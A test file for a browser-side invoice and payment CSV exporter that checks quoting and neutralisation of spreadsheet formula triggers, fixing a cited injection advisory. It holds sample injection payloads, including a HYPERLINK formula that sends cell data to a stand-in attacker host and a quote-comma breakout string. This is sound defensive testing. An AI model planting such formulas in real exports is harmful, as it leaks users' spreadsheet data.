import { buildCsv, neutralizeSpreadsheetText } from './generate-csv';

/**
 * The invoice / payment CSV export is built in the browser from values other tenant users write
 * (contact names, payment notes, the recorder's name). It used to quote fields with
 * `JSON.stringify`, which is not CSV quoting, and never neutralised formula triggers
 * (GHSA-7xp5-j564-4752).
 */
describe('buildCsv', () => {
	it('keeps a quote-comma breakout inside one cell', () => {
		const value = 'x",=1+1,"';

		// CONTROL: the pre-fix field encoder — `JSON.stringify` with the `N/A` replacer — escapes the
		// embedded quote as \" , which CSV does not understand, so the field ends early and `=1+1`
		// becomes a cell of its own.
		const preFix = JSON.stringify(value, (_key, v) => (v === null ? 'N/A' : v));
		expect(preFix.split(',').length).toBeGreaterThan(1);
		expect(preFix.split(',')[1]).toBe('=1+1');

		const line = buildCsv([{ note: value }], ['Note']).split('\r\n')[1];
		// One field: quotes doubled, escape prefix added, no bare delimiter outside the quotes.
		expect(line).toBe('"x"",=1+1,"""');
		expect(line.startsWith('"') && line.endsWith('"')).toBe(true);
	});

	it('escapes a leading formula trigger in a cell and in a header', () => {
		const csv = buildCsv([{ contact: '=HYPERLINK("http://attacker/?"&A2,"x")' }], ['=1+1']);
		const [header, row] = csv.split('\r\n');

		expect(header).toBe(`"'=1+1"`);
		expect(row).toBe(`"'=HYPERLINK(""http://attacker/?""&A2,""x"")"`);
	});

	it('does not change values a spreadsheet reads correctly', () => {
		const csv = buildCsv(
			[{ name: 'Ada Lovelace', amount: 12.5, negative: '-12.50', paid: true, note: null, missing: undefined }],
			['Name', 'Amount', 'Negative', 'Paid', 'Note', 'Missing']
		);

		expect(csv.split('\r\n')[1]).toBe('"Ada Lovelace",12.5,"-12.50",true,"N/A",');
	});

	it('writes a date as the bare timestamp the old encoder produced', () => {
		const invoiceDate = new Date('2024-01-02T03:04:05.000Z');

		// CONTROL: the pre-fix encoder wrote the ISO timestamp as its own quoted field. Re-quoting the
		// output of `JSON.stringify` — a JSON string literal — would leave those quotes in the cell.
		const preFix = JSON.stringify(invoiceDate, (_key, v) => (v === null ? 'N/A' : v));
		expect(preFix).toBe('"2024-01-02T03:04:05.000Z"');

		expect(buildCsv([{ invoiceDate }], ['Date']).split('\r\n')[1]).toBe('"2024-01-02T03:04:05.000Z"');
	});

	it('keeps an object value inside one CSV field', () => {
		const line = buildCsv([{ meta: { a: 1 }, name: 'Ada' }], ['Meta', 'Name']).split('\r\n')[1];

		expect(line).toBe('"{""a"":1}","Ada"');
	});

	it('accepts a pre-joined header line, as the invoices page used to pass', () => {
		expect(buildCsv([{ a: '1' }], 'A,B').split('\r\n')[0]).toBe('A,B');
	});
});

describe('neutralizeSpreadsheetText', () => {
	it.each(['=1+1', '+1+1', '-1+1', '@SUM(A1)', '\t=1', '\r=1', '＝1+1', "'already quoted"])(
		'prefixes %j',
		(value) => {
			expect(neutralizeSpreadsheetText(value)).toBe(`'${value}`);
		}
	);

	it.each(['Ada Lovelace', '-12.50', '+3', '', 'a=b'])('leaves %j alone', (value) => {
		expect(neutralizeSpreadsheetText(value)).toBe(value);
	});
});
